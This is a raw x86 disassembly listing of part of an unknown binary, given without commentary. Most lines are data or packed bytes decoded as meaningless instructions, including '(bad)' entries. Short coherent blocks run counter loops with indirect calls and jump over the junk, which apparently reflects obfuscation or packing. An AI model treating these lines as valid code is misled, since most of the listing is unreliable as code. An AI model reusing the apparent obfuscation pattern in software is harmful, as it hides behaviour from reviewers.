  407479:	jb     0x4074d4
  40747b:	out    dx,eax
  40747c:	or     BYTE PTR [edi-0x46],ah
  40747f:	sbb    BYTE PTR [ecx],0x35
  407482:	lds    edi,FWORD PTR [esi+0x7e]
  407485:	mov    bh,BYTE PTR [edi+0x7e]
  407488:	jle    0x4074a4
  40748a:	(bad)  
  40748b:	fs sub al,0xef
  40748e:	push   0x23
  407490:	sub    ebp,edx
  407492:	push   0xeb3cba6c
  407497:	ins    DWORD PTR es:[edi],dx
  407498:	out    dx,al
  407499:	int3   
  40749a:	mov    esp,0x4c8f7d3
  40749f:	lds    eax,FWORD PTR [esp+ebp*8]
  4074a2:	adc    ah,BYTE PTR fs:[eax-0x5b66b707]
  4074a9:	dec    edx
  4074aa:	pop    es
  4074ab:	rcr    bh,cl
  4074ad:	push   0xffffff8d
  4074af:	jmp    0xe7d9:0xf933c897
  4074b6:	in     eax,dx
  4074b7:	mov    ecx,0x616960b5
  4074bc:	add    eax,ebp
  4074be:	push   0x6fe8c4c0
  4074c3:	sahf   
  4074c4:	mov    al,0x42
  4074c6:	xchg   esi,eax
  4074c7:	sti    
  4074c8:	jp     0x407494
  4074ca:	push   esi
  4074cb:	or     eax,0xc06a59ba
  4074d0:	mov    ebx,DWORD PTR [ecx-0x4]
  4074d3:	sbb    ecx,DWORD PTR [edx]
  4074d5:	mov    ds:0x373f7120,eax
  4074da:	pop    esi
  4074db:	add    eax,0x1f03d370
  4074e0:	pushf  
  4074e1:	stos   BYTE PTR es:[edi],al
  4074e2:	or     eax,0x61f5971
  4074e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4074e8:	mov    ch,ah
  4074ea:	aaa    
  4074eb:	xchg   edi,eax
  4074ec:	inc    edx
  4074ed:	nop
  4074ee:	hlt    
  4074ef:	nop
  4074f0:	mov    dl,0x36
  4074f2:	dec    edx
  4074f3:	not    ecx
  4074f5:	addr16 pop ebx
  4074f7:	outs   dx,BYTE PTR ds:[esi]
  4074f8:	ins    DWORD PTR es:[edi],dx
  4074f9:	jmp    0x4074bb
  4074fb:	lods   al,BYTE PTR ds:[esi]
  4074fc:	enter  0x34b6,0x26
  407500:	mov    esp,0x4ab5f40e
  407505:	aad    0x5
  407507:	push   ebx
  407508:	and    al,0xb3
  40750a:	cmp    dl,al
  40750c:	leave  
  40750d:	stos   BYTE PTR es:[edi],al
  40750e:	out    dx,eax
  40750f:	leave  
  407510:	retf   0x13c4
  407513:	inc    edi
  407514:	sub    ebp,0x4307b7c4
  40751a:	es pusha 
  40751c:	popf   
  40751d:	clc    
  40751e:	mov    esi,DWORD PTR [esi-0x33f5e969]
  407524:	imul   ebx,DWORD PTR [ecx-0x68],0x40
  407528:	sub    ebx,DWORD PTR [eax]
  40752a:	dec    ecx
  40752b:	mov    gs,WORD PTR [eax+0x3c226698]
  407531:	xchg   esp,eax
  407532:	lods   eax,DWORD PTR ds:[esi]
  407533:	ficomp WORD PTR [esp+eiz*8+0x22d914]
  40753a:	xor    ebp,DWORD PTR [ebp+0x32]
  40753d:	test   eax,0x511df725
  407542:	not    BYTE PTR cs:[edi]
  407545:	and    DWORD PTR [edi-0x4c],ebp
  407548:	sub    cl,dh
  40754a:	pop    eax
  40754b:	inc    ebx
  40754c:	push   ebp
  40754d:	cmc    
  40754e:	or     esp,esp
  407550:	outs   dx,BYTE PTR ds:[esi]
  407551:	or     ebx,DWORD PTR [eax+0x734586c]
  407557:	loope  0x40751a
  407559:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40755a:	push   edx
  40755b:	cmp    edx,ebx
  40755d:	mov    DWORD PTR [edi-0x5d5eac10],ecx
  407563:	pop    eax
  407564:	aaa    
  407565:	das    
  407566:	dec    esp
  407567:	ret    0xc76f
  40756a:	call   0x4a889603
  40756f:	cld    
  407570:	out    dx,al
  407571:	cdq    
  407572:	mov    ebp,0xc9f91ea9
  407577:	out    0xd5,eax
  407579:	(bad)  
  40757a:	jbe    0x4075f1
  40757c:	dec    ebx
  40757d:	pushf  
  40757e:	push   ds
  40757f:	inc    edi
  407580:	mov    eax,0xb970a7a7
  407585:	retf   0xbb0a
  407588:	fwait
  407589:	je     0x407556
  40758b:	je     0x407566
  40758d:	fadd   DWORD PTR [ebx]
  40758f:	mov    ds:0xeccb37a4,eax
  407594:	sbb    eax,DWORD PTR [ecx+0x1a]
  407597:	test   eax,0x769487bb
  40759c:	rol    BYTE PTR [ebp-0x1e],cl
  40759f:	mov    DWORD PTR [esi+0x6eb03d72],esp
  4075a5:	and    bh,BYTE PTR [edi+0x14]
  4075a8:	mov    bl,BYTE PTR [ebx-0x62]
  4075ab:	adc    DWORD PTR [ecx-0x2a],esp
  4075ae:	ror    BYTE PTR [ebx],0x38
  4075b1:	push   ecx
  4075b2:	mov    ds:0x356afdf4,al
  4075b7:	enter  0xf038,0x5c
  4075bb:	push   esp
  4075bc:	mov    ds:0x7c66d784,al
  4075c1:	stos   BYTE PTR es:[edi],al
  4075c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4075c3:	enter  0xf5bc,0x1a
  4075c7:	fnstcw WORD PTR [eax]
  4075c9:	out    0x5d,eax
  4075cb:	mov    eax,ds:0x1c2b087f
  4075d0:	xchg   esi,eax
  4075d1:	clc    
  4075d2:	xor    al,0x82
  4075d4:	cmp    eax,0x9c58caac
  4075d9:	bound  ecx,QWORD PTR [ecx+0x16]
  4075dc:	push   ebp
  4075dd:	retf   0x1506
  4075e0:	mov    ecx,0x56a51ba9
  4075e5:	mov    bl,0xf
  4075e7:	xor    al,BYTE PTR [ebx-0xc]
  4075ea:	fnsave [edx+0x5cebdd3e]
  4075f0:	mov    ?,WORD PTR [ecx+ebx*2+0x58]
  4075f4:	lds    eax,FWORD PTR [ecx-0x5219b312]
  4075fa:	adc    eax,0x1ff9d4f
  4075ff:	mov    cl,0x9c
  407601:	push   edx
  407602:	sub    bh,dh
  407604:	xchg   edi,eax
  407605:	je     0x40766c
  407607:	or     al,0xaa
  407609:	push   ax
  40760b:	hlt    
  40760c:	push   eax
  40760d:	adc    DWORD PTR [ecx+0x779146f2],edx
  407613:	dec    eax
  407614:	leave  
  407615:	ds loop 0x4075fc
  407618:	push   ebx
  407619:	bound  esi,QWORD PTR [ebx-0x7bf0226b]
  40761f:	jmp    0x40763b
  407621:	add    BYTE PTR [eax],al
  407623:	push   ebx
  407624:	jmp    0x408d87
  407629:	and    DWORD PTR ds:0x42ed4b,0x0
  407633:	jmp    0x407647
  407638:	xor    edx,edx
  40763a:	xor    edx,DWORD PTR ds:0x42ed4b
  407640:	inc    edx
  407641:	mov    DWORD PTR ds:0x42ed4b,edx
  407647:	cmp    DWORD PTR ds:0x42ed4b,0x1b
  40764e:	jae    0x40768b
  407654:	cmp    DWORD PTR ds:0x42ed4b,0xa
  40765b:	jne    0x40766a
  407661:	push   DWORD PTR [ebp-0x10]
  407664:	call   DWORD PTR ds:0x42ea33
  40766a:	cmp    DWORD PTR ds:0x42ed4b,0x9
  407671:	jne    0x407686
  407677:	xor    edx,edx
  407679:	xor    edx,DWORD PTR ds:0x42ed4b
  40767f:	inc    edx
  407680:	mov    DWORD PTR ds:0x42ed4b,edx
  407686:	jmp    0x407638
  40768b:	mov    edx,DWORD PTR [ebp-0x8]
  40768e:	mov    edi,DWORD PTR [ebp-0x10]
  407691:	sub    edi,edx
  407693:	jmp    0x407844
  407698:	or     DWORD PTR [ecx+0x67a86788],ebp
  40769e:	icebp  
  40769f:	jno    0x407690
  4076a1:	out    dx,al
  4076a2:	jns    0x4076bb
  4076a4:	mov    eax,DWORD PTR [ebx-0x6]
  4076a7:	mov    esi,0x7e7ec241
  4076ac:	mov    bh,BYTE PTR [edi+0x7e]
  4076af:	jle    0x407640
  4076b1:	mov    esi,0x10c04338
  4076b6:	sbb    ah,BYTE PTR [edi]
  4076b8:	lds    ecx,FWORD PTR [ebx+0x124a9c89]
  4076be:	imul   eax,DWORD PTR [esi+0x2a2b3b3c],0x89bc3fae
  4076c8:	jl     0x4076f2
  4076ca:	into   
  4076cb:	cdq    
  4076cc:	shr    BYTE PTR [edx],1
  4076ce:	sub    ch,bl
  4076d0:	les    esi,FWORD PTR [bx+si]
  4076d3:	xor    al,dl
  4076d5:	push   edx
  4076d6:	retf   0x5cdf
  4076d9:	jg     0x40771c
  4076db:	adc    BYTE PTR [esi-0x27],ah
  4076de:	pushf  
  4076df:	into   
  4076e0:	jne    0x407698
  4076e2:	jmp    0x407670
  4076e4:	dec    esp
  4076e5:	(bad)  
  4076e6:	inc    edi
  4076e7:	sbb    al,0x7
  4076e9:	js     0x407707
  4076eb:	push   eax
  4076ec:	inc    eax
  4076ed:	in     eax,dx
  4076ee:	xchg   esi,eax
  4076ef:	arpl   WORD PTR [eax],ax
  4076f1:	adc    eax,0xe4669943
  4076f6:	lods   eax,DWORD PTR ds:[esi]
  4076f7:	popa   
  4076f8:	dec    edx
  4076f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4076fa:	(bad)  
  4076fb:	cmp    al,0x9
  4076fd:	inc    edi
  4076fe:	mov    edx,0xdca498f7
  407704:	call   0x17eb:0x8a434ee2
  40770b:	movntps XMMWORD PTR [edi+edi*4-0x40742c43],xmm7
  407713:	cmp    DWORD PTR [esp+ebx*8],eax
  407716:	call   0x4152:0x11b49744
  40771d:	loopne 0x40775c
  40771f:	push   edi
  407720:	push   esi
  407721:	dec    esi
  407722:	arpl   WORD PTR [ebx+eiz*2+0x26c1f483],cx
  407729:	or     dh,BYTE PTR [esi]
  40772b:	xchg   ebp,eax
  40772c:	fimul  DWORD PTR [edi-0x77]
  40772f:	dec    ecx
  407730:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407731:	mov    edx,0x95a29e7b
  407736:	jp     0x407728
  407738:	push   edi
  407739:	in     eax,dx
  40773a:	ret    
  40773b:	dec    esi
  40773c:	(bad)  
  40773d:	mov    ebx,0xb0604ec4
  407742:	mov    eax,ds:0x5739ebb8
  407747:	mov    edi,0x39721b3d
  40774c:	or     eax,0x84ceb4d
  407751:	in     eax,0x6
  407753:	jne    0x40777c
  407755:	test   BYTE PTR [eax+0x282ca9b4],bh
  40775b:	dec    eax
  40775c:	dec    ebx
  40775d:	jb     0x407730
  40775f:	sub    ecx,DWORD PTR [ebx-0x5286def8]
  407765:	lods   eax,DWORD PTR ds:[esi]
  407766:	test   eax,0xf3de8278
  40776b:	ret    
  40776c:	adc    cl,al
  40776e:	retf   
  40776f:	pop    ecx
  407770:	cmp    BYTE PTR [ecx+ebx*4+0x43624234],0x45
  407778:	inc    edi
  407779:	dec    BYTE PTR [edx-0x20e2db2c]
  40777f:	add    BYTE PTR [ebp-0x601291b8],cl
  407785:	mov    esp,0xf7321f4a
  40778a:	jns    0x4077b1
  40778c:	repz dec ebx
  40778e:	dec    esi
  40778f:	pop    es
  407790:	mov    gs,WORD PTR [esi+0x2f]
  407793:	or     DWORD PTR ds:0xb3f91742,edx
  407799:	sbb    eax,0x47de941d
  40779e:	jbe    0x407723
  4077a0:	(bad)  
  4077a1:	ins    BYTE PTR es:[edi],dx
  4077a2:	data16 ins BYTE PTR es:[edi],dx
  4077a4:	out    dx,al
  4077a5:	add    eax,0xc50fba0c
  4077aa:	inc    esi
  4077ab:	pop    edx
  4077ac:	(bad)  [edi-0x470e31b5]
  4077b2:	in     al,0xab
  4077b4:	bound  edi,QWORD PTR [ecx-0x61fd540b]
  4077ba:	mov    BYTE PTR [edx],0xfe
  4077bd:	test   BYTE PTR [esi],cl
  4077bf:	in     eax,0x8e
  4077c1:	mov    ebx,0x668bbbbb
  4077c6:	xlat   BYTE PTR ds:[ebx]
  4077c7:	int    0x67
  4077c9:	sti    
  4077ca:	push   edx
  4077cb:	xchg   esp,eax
  4077cc:	and    cl,BYTE PTR [ebx-0x80]
  4077cf:	cmp    BYTE PTR [eax],0x8b
  4077d2:	enter  0xf0d,0x79
  4077d6:	or     DWORD PTR [edi+0x7e5ee7c8],0x7be5f4ce
  4077e0:	pop    ss
  4077e1:	dec    ebp
  4077e2:	mov    es,WORD PTR [ebx-0x17]
  4077e5:	or     eax,0x81796870
  4077ea:	sbb    DWORD PTR ds:0xce35c822,eax
  4077f0:	and    al,0xa
  4077f2:	mov    ?,WORD PTR [edi-0x3af692af]
  4077f8:	sbb    BYTE PTR [edi-0x24],0x7c
  4077fc:	mov    bl,0x69
  4077fe:	xchg   esp,eax
  4077ff:	repnz icebp 
  407801:	mov    edx,0x8626c161
  407806:	shr    dl,cl
  407808:	push   0x2b3dd66b
  40780d:	out    0x3e,al
  40780f:	lea    edx,[eax]
  407811:	xchg   DWORD PTR [eax],ebx
  407813:	pop    ebx
  407814:	repz add DWORD PTR [esi+0x6e],ecx
  407818:	mov    ch,BYTE PTR [eax]
  40781a:	mov    fs,WORD PTR [ecx+0x68]
  40781d:	cmp    esi,DWORD PTR [eax+0x6ad44d66]
  407823:	and    DWORD PTR [eax+ebx*8-0xefe64eb],eax
  40782a:	in     eax,0x24
  40782c:	out    0xf6,eax
  40782e:	mov    BYTE PTR [ecx-0x43a12531],dh
  407834:	jbe    0x4077b6
  407836:	xlat   BYTE PTR ds:[ebx]
  407837:	mov    ebp,DWORD PTR [ecx]
  407839:	sub    DWORD PTR [ecx+0x37],eax
  40783c:	outs   dx,BYTE PTR ds:[esi]
  40783d:	push   ss
  40783e:	fsubr  st(4),st
  407840:	bsr    eax,esp
  407843:	(bad)  
  407844:	mov    edx,DWORD PTR [ebp-0x4]
  407847:	adc    DWORD PTR ds:0x4303c9,0x43044f
  407851:	xor    edx,eax
  407853:	add    edx,ecx
  407855:	cmp    edi,edx
  407857:	mov    DWORD PTR ds:0x4303ed,0x688e
  407861:	jb     0x40910d
  407867:	mov    DWORD PTR ds:0x42e744,0x1e
  407871:	cmp    DWORD PTR ds:0x42e744,0x0
  407878:	je     0x4078a9
  40787e:	cmp    DWORD PTR ds:0x42e744,0x25
  407885:	jne    0x407896
  40788b:	push   0x2141
  407890:	call   DWORD PTR ds:0x42ea37
  407896:	mov    edi,DWORD PTR ds:0x42e744
  40789c:	dec    edi
  40789d:	mov    DWORD PTR ds:0x42e744,edi
  4078a3:	jmp    0x407871
  4078a8:	inc    edx
  4078a9:	mov    edx,DWORD PTR [ebp-0x28]
  4078ac:	mov    edi,DWORD PTR [ebp-0x4]
  4078af:	xor    edx,eax
  4078b1:	xor    edi,eax
  4078b3:	sub    ebx,DWORD PTR ds:0x42ed4f
  4078b9:	add    edi,ecx
  4078bb:	add    edx,ecx
  4078bd:	and    DWORD PTR ds:0x4303bd,0x0
  4078c7:	xor    ebx,ebx
  4078c9:	or     ebx,DWORD PTR ds:0x4303bd
  4078cf:	inc    ebx
  4078d0:	mov    DWORD PTR ds:0x4303bd,ebx
  4078d6:	cmp    DWORD PTR ds:0x4303bd,0x15
  4078dd:	jne    0x4078f1
  4078e3:	push   0x1
  4078e5:	push   DWORD PTR [ebp-0x20]
  4078e8:	push   DWORD PTR [ebp-0x10]
  4078eb:	call   DWORD PTR ds:0x42eba7
  4078f1:	cmp    DWORD PTR ds:0x4303bd,0x11
  4078f8:	jb     0x4078c7
  4078fe:	imul   edx,edi
  407901:	mov    edi,DWORD PTR [ebp-0x8]
  407904:	mov    ebx,DWORD PTR [ebp-0x10]
  407907:	sub    ebx,edi
  407909:	cmp    ebx,edx
  40790b:	ja     0x40791d
  407911:	mov    edx,DWORD PTR [ebp-0x4]
  407914:	xor    edx,eax
  407916:	add    edx,ecx
  407918:	jmp    0x40877e
  40791d:	mov    edx,DWORD PTR [ebp-0x2c]
  407920:	mov    edi,DWORD PTR [ebp-0x4]
  407923:	xor    edx,eax
  407925:	xor    edi,eax
  407927:	add    edi,ecx
  407929:	add    edx,ecx
  40792b:	imul   edx,edi
  40792e:	mov    edi,DWORD PTR [ebp-0x8]
  407931:	jmp    0x407ae2
  407936:	ret    0x1100
  407939:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40793a:	shl    DWORD PTR [ebp+0x7ad26172],1
  407940:	dec    edi
  407941:	inc    DWORD PTR [edx-0x220e42dd]
  407947:	sar    BYTE PTR [esi+0x7e],0x8a
  40794b:	jg     0x4079cb
  40794d:	jle    0x4079cb
  40794f:	mov    BYTE PTR [edx+0x76],ah
  407952:	jge    0x407977
  407954:	push   ebx
  407955:	and    al,0x15
  407957:	xor    al,0x8c
  407959:	stc    
  40795a:	sub    eax,0x43b3f29b
  40795f:	inc    eax
  407960:	jecxz  0x407903
  407962:	xchg   esp,eax
  407963:	cmovp  edx,esp
  407966:	neg    BYTE PTR [edi+0x52]
  407969:	call   0xbd6c92c2
  40796e:	sub    edx,eax
  407970:	das    
  407971:	push   ss
  407972:	cdq    
  407973:	push   esi
  407974:	adc    al,BYTE PTR [ebp-0x178893]
  40797a:	mov    dh,ch
  40797c:	ins    DWORD PTR es:[edi],dx
  40797d:	aad    0xc4
  40797f:	xchg   edi,eax
  407980:	jmp    0x677c:0x136cbc0b
  407987:	inc    edx
  407988:	rcl    BYTE PTR [eax+0x47],0x67
  40798c:	or     eax,0x77f158b0
  407991:	shl    DWORD PTR [ecx],1
  407993:	(bad)  
  407994:	leave  
  407995:	in     al,dx
  407996:	pop    ebx
  407997:	add    al,0x82
  407999:	(bad)  
  40799a:	ja     0x407939
  40799c:	in     eax,0xd1
  40799e:	idiv   BYTE PTR [ebx+0x20]
  4079a1:	imul   edi,DWORD PTR [edi+eax*4],0xf17d48f7
  4079a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4079a9:	dec    ecx
  4079aa:	dec    ecx
  4079ab:	or     bh,bl
  4079ad:	mov    esi,0xd6073844
  4079b2:	push   edi
  4079b3:	xlat   BYTE PTR ds:[ebx]
  4079b4:	mov    eax,0xa4bf35e3
  4079b9:	shl    ebp,0x15
  4079bc:	mov    al,0xa4
  4079be:	out    dx,al
  4079bf:	jle    0x4079c0
  4079c1:	pop    ds
  4079c2:	leave  
  4079c3:	jne    0x407a0c
  4079c5:	jae    0x4079ae
  4079c7:	xor    al,0xb5
  4079c9:	xchg   esi,eax
  4079ca:	inc    ebp
  4079cb:	fs aad 0x45
  4079ce:	out    dx,eax
  4079cf:	xchg   ebp,eax
  4079d0:	mov    esp,DWORD PTR [ecx-0x62d85e3e]
  4079d6:	dec    eax
  4079d7:	pop    es
  4079d8:	mov    ebx,0x8aa83057
  4079dd:	repz mov edi,0x3e317f12
  4079e3:	pop    es
  4079e4:	fcmovu st,st(1)
  4079e6:	xchg   ecx,eax
  4079e7:	sub    eax,0xa7bcf06c
  4079ec:	add    eax,0x30ba7441
  4079f1:	clc    
  4079f2:	sub    bh,BYTE PTR [edi-0x2712fb4b]
  4079f8:	and    cl,dh
  4079fa:	retf   0xf95d
  4079fd:	or     DWORD PTR [edx],esp
  4079ff:	lods   al,BYTE PTR ds:[esi]
  407a00:	cmp    DWORD PTR ds:0x53058f71,ebx
  407a06:	mov    ch,0x84
  407a08:	xor    al,0x37
  407a0a:	hlt    
  407a0b:	jno    0x407a02
  407a0d:	add    DWORD PTR gs:[ebp-0x597322cd],edx
  407a14:	adc    esp,esi
  407a16:	or     eax,0xc35e0aac
  407a1b:	pop    ss
  407a1c:	push   esi
  407a1d:	mov    eax,0x6db9ab6f
  407a22:	and    bh,al
  407a24:	push   esi
  407a25:	mov    esp,0xf8750a49
  407a2a:	adc    al,0x5d
  407a2c:	mov    al,BYTE PTR ds:0xd03a3bd7
  407a32:	xchg   edx,eax
  407a33:	push   0xe
  407a35:	jne    0x407a16
  407a37:	lock pusha 
  407a39:	dec    eax
  407a3a:	cmp    esi,DWORD PTR [ebx+0x74abe672]
  407a40:	fwait
  407a41:	out    0x14,al
  407a43:	push   0xffffffbf
  407a45:	or     cl,BYTE PTR ds:0x5c8b2170
  407a4b:	cmp    eax,0xa2886ff2
  407a50:	daa    
  407a51:	mov    ecx,0x367c2cc2
  407a56:	or     BYTE PTR [ebp+0x7e967074],bh
  407a5c:	jmp    0x407aa1
  407a5e:	xchg   ebx,eax
  407a5f:	xor    DWORD PTR [ecx+0x5b5b0c6a],eax
  407a65:	inc    esi
  407a66:	xchg   edx,eax
  407a67:	mov    eax,es:0x229ca368
  407a6d:	fcom   DWORD PTR [edx+ebp*8]
  407a70:	sti    
  407a71:	sub    edx,0x3
  407a74:	int3   
  407a75:	adc    dh,al
  407a77:	in     al,0x7
  407a79:	inc    esi
  407a7a:	les    ebp,FWORD PTR [ebp+esi*2+0x60]
  407a7e:	jns    0x407a2d
  407a80:	fs pop ds
  407a82:	lahf   
  407a83:	inc    esi
  407a84:	loop   0x407a35
  407a86:	fcomp  DWORD PTR [ebx+0x1d00b3a9]
  407a8c:	adc    DWORD PTR [ebx],ebp
  407a8e:	or     bh,BYTE PTR [esp+eax*2-0x27dc1ae1]
  407a95:	add    BYTE PTR [esi-0x295571d6],0xd8
  407a9c:	or     al,0x62
  407a9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a9f:	shl    BYTE PTR ds:0xdf4f4750,cl
  407aa5:	retf   
  407aa6:	jns    0x407ab3
  407aa8:	mov    esp,0x3cbf3c11
  407aad:	out    dx,eax
  407aae:	les    ebp,FWORD PTR [eax]
  407ab0:	idiv   DWORD PTR [ebx]
  407ab2:	jl     0x407af9
  407ab4:	mov    fs,WORD PTR [edi+0x3086a666]
  407aba:	mov    esi,0xce4578f2
  407abf:	(bad)
  407ac2:	xchg   ebp,eax
  407ac3:	sbb    ebp,DWORD PTR [ebx]
  407ac5:	mov    cl,0xaf
  407ac7:	jns    0x407abd
  407ac9:	sub    dh,BYTE PTR [eax]
  407acb:	push   0xfffffff3
  407acd:	popf   
  407ace:	fidiv  DWORD PTR [esi-0x5dc96eca]
  407ad4:	xchg   ecx,eax
  407ad5:	pop    ss
  407ad6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ad7:	js     0x407b23
  407ad9:	fadd   st,st(3)
  407adb:	and    dh,BYTE PTR [eax-0xf]
  407ade:	push   ebp
  407adf:	test   ebp,0xf05d8b6f
  407ae5:	sub    ebx,edi
  407ae7:	cmp    ebx,edx
  407ae9:	ja     0x407af7
  407aef:	mov    edx,DWORD PTR [ebp-0x28]
  407af2:	jmp    0x408770
  407af7:	mov    edx,DWORD PTR [ebp-0x30]
  407afa:	mov    edi,DWORD PTR [ebp-0x4]
  407afd:	jmp    0x407cae
  407b02:	mov    WORD PTR [edx+0x6130bf0c],?
  407b08:	dec    ebp
  407b09:	jno    0x407ae6
  407b0b:	les    ecx,FWORD PTR [esi+0x3160ddca]
  407b11:	popf   
  407b12:	imul   eax,ecx,0x7f8a7e7e
  407b18:	jle    0x407b98
  407b1a:	mov    bl,0x8f
  407b1c:	sbb    al,0xf5
  407b1e:	sbb    BYTE PTR [ebx],0xec
  407b21:	jo     0x407b1d
  407b23:	nop
  407b24:	mov    BYTE PTR [ecx+0x3f8a720],bh
  407b2a:	sar    DWORD PTR [eax-0x4b],cl
  407b2d:	addr16 push 0xffffff9b
  407b30:	or     DWORD PTR [edx-0x7d],edi
  407b33:	and    ebp,edi
  407b35:	jp     0x407b6d
  407b37:	adc    DWORD PTR [ecx*4+0x48640a18],0xf7af213f
  407b42:	pop    ds
  407b43:	push   esi
  407b44:	xor    DWORD PTR [bp-0x212a],0x2302048e
  407b4d:	xchg   ebp,eax
  407b4e:	stos   DWORD PTR es:[edi],eax
  407b4f:	js     0x407afc
  407b51:	jne    0x407b50
  407b53:	jge    0x407b2f
  407b55:	add    eax,0x6c89c147
  407b5a:	fidiv  WORD PTR [ebx+0x3e]
  407b5d:	cdq    
  407b5e:	call   FWORD PTR [ebx+0x3ee735fa]
  407b64:	jmp    0x4c5bedc3
  407b69:	sub    edx,esp
  407b6b:	jns    0x407afa
  407b6d:	pusha  
  407b6e:	hlt    
  407b6f:	je     0x407b8c
  407b71:	sbb    bh,dh
  407b73:	xor    BYTE PTR [edx+0x428e98ec],0xce
  407b7a:	push   ebp
  407b7b:	xchg   BYTE PTR [esi+0x19],bl
  407b7e:	pushf  
  407b7f:	(bad)  
  407b80:	mov    ds:0x954622ca,eax
  407b85:	dec    esp
  407b86:	push   ecx
  407b87:	or     ecx,DWORD PTR [edx+0x2c]
  407b8a:	int3   
  407b8b:	cmp    ch,BYTE PTR [eax+esi*4-0x15c6183a]
  407b92:	cmp    bh,BYTE PTR [esi-0x483ba099]
  407b98:	arpl   ax,si
  407b9a:	mov    ebx,0x4b4992f9
  407b9f:	pop    edx
  407ba0:	sub    ecx,DWORD PTR [ecx]
  407ba2:	add    al,0x43
  407ba4:	inc    edx
  407ba5:	test   BYTE PTR [edx+0x15],dl
  407ba8:	int    0x7e
  407baa:	jns    0x407b6a
  407bac:	popa   
  407bad:	iret   
  407bae:	ss jge 0x407b82
  407bb1:	ds sti 
  407bb3:	rcpps  xmm1,XMMWORD PTR [esi+0x6b]
  407bb7:	aas    
  407bb8:	mov    DWORD PTR [esi+0x37],ebx
  407bbb:	add    eax,0x83c49f2e
  407bc0:	stos   DWORD PTR es:[edi],eax
  407bc1:	adc    BYTE PTR [ecx-0x6159300f],bl
  407bc7:	push   es
  407bc8:	mov    bl,BYTE PTR [edi+0x77]
  407bcb:	push   edi
  407bcc:	cld    
  407bcd:	xlat   BYTE PTR ds:[ebx]
  407bce:	(bad)  
  407bcf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407bd0:	add    eax,0xbb8c6860
  407bd5:	dec    edi
  407bd6:	(bad)  
  407bd7:	mov    edi,0xfc76d531
  407bdc:	ins    BYTE PTR es:[edi],dx
  407bdd:	stc    
  407bde:	mov    ebx,DWORD PTR [ecx+0x28f0398d]
  407be4:	in     al,0xcb
  407be6:	ins    BYTE PTR es:[edi],dx
  407be7:	outs   dx,DWORD PTR ds:[esi]
  407be8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407be9:	mov    al,0x59
  407beb:	add    ch,BYTE PTR [ebx+0x11]
  407bee:	mov    eax,DWORD PTR [edx]
  407bf0:	pop    ss
  407bf1:	xor    DWORD PTR [edx-0x54e15716],edi
  407bf7:	jnp    0x407c0f
  407bf9:	jg     0x407bae
  407bfb:	sub    al,0x18
  407bfd:	jge    0x407bed
  407bff:	xchg   ebp,eax
  407c00:	in     eax,dx
  407c01:	out    dx,al
  407c02:	sti    
  407c03:	push   eax
  407c04:	in     eax,dx
  407c05:	fldenv ds:0x9b2d38b9
  407c0b:	daa    
  407c0c:	jmp    0x6fe4e341
  407c11:	add    al,0x6c
  407c13:	mov    esp,0xd7d2afd4
  407c18:	out    0x55,al
  407c1a:	and    DWORD PTR [eax-0x3985a070],esi
  407c20:	adc    dl,BYTE PTR [esi-0x4607679b]
  407c26:	mov    ah,0xa6
  407c28:	cli    
  407c29:	push   esp
  407c2a:	sbb    al,0x18
  407c2c:	int    0x9
  407c2e:	fsubp  st(3),st
  407c30:	lods   eax,DWORD PTR ds:[esi]
  407c31:	int    0x17
  407c33:	jo     0x407bc2
  407c35:	js     0x407c86
  407c37:	loope  0x407bd9
  407c39:	(bad)  
  407c3a:	mov    ds:0x110dda09,eax
  407c3f:	iret   
  407c40:	jnp    0x407c73
  407c42:	in     al,0xf9
  407c44:	adc    BYTE PTR [edi],al
  407c46:	pop    edx
  407c47:	xor    eax,DWORD PTR [eax+ebp*4-0x4d]
  407c4b:	arpl   cx,di
  407c4d:	jecxz  0x407c65
  407c4f:	(bad)  
  407c50:	mov    ebx,0x14013af4
  407c55:	push   ecx
  407c56:	pop    edi
  407c57:	xchg   DWORD PTR [ebp-0x439a87e6],ebp
  407c5d:	mov    ebp,0xec8f2db
  407c62:	stos   DWORD PTR es:[edi],eax
  407c63:	hlt    
  407c64:	or     al,bl
  407c66:	sub    al,0x9e
  407c68:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  407c6a:	mov    bh,0x27
  407c6c:	xchg   edi,eax
  407c6d:	scas   eax,DWORD PTR es:[edi]
  407c6e:	xor    ecx,DWORD PTR [eax+0x56c51baf]
  407c74:	xchg   edi,eax
  407c75:	mov    dh,0x8a
  407c77:	sbb    eax,0xdcdacb71
  407c7c:	adc    eax,0xf3057e30
  407c81:	inc    BYTE PTR [ebx]
  407c83:	mov    eax,ds:0x90481ff3
  407c88:	sub    al,0x87
  407c8a:	inc    ebp
  407c8b:	ja     0x407cdb
  407c8d:	pextrw esi,(bad),0xc5
  407c8f:	xor    DWORD PTR [ebx-0x3b],edi
  407c92:	repz mov ecx,0x1cb4be17
  407c98:	jne    0x407c59
  407c9a:	add    dh,BYTE PTR [edx]
  407c9c:	je     0x407c84
  407c9e:	mov    es,WORD PTR [esi-0x5a]
  407ca1:	retf   
  407ca2:	mov    bl,0x4a
  407ca4:	mov    esi,0x4706bc66
  407ca9:	rcl    bh,cl
  407cab:	outs   dx,BYTE PTR ds:[esi]
  407cac:	(bad)  
  407cae:	xor    edx,eax
  407cb0:	xor    edi,eax
  407cb2:	add    edi,ecx
  407cb4:	add    edx,ecx
  407cb6:	imul   edx,edi
  407cb9:	mov    edi,DWORD PTR [ebp-0x8]
  407cbc:	mov    ebx,DWORD PTR [ebp-0x10]
  407cbf:	sub    ebx,edi
  407cc1:	cmp    ebx,edx
  407cc3:	jmp    0x407e74
  407cc8:	imul   esp,DWORD PTR [eax],0xfffffff2
  407ccb:	mov    cl,0x71
  407ccd:	jno    0x407d38
  407ccf:	loopne 0x407d06
  407cd1:	(bad)  
  407cd2:	cmp    bh,BYTE PTR [eax+0xd32bd25]
  407cd8:	test   edi,ecx
  407cda:	jle    0x407d5a
  407cdc:	mov    bh,BYTE PTR [edi+0x7e]
  407cdf:	jle    0x407c8e
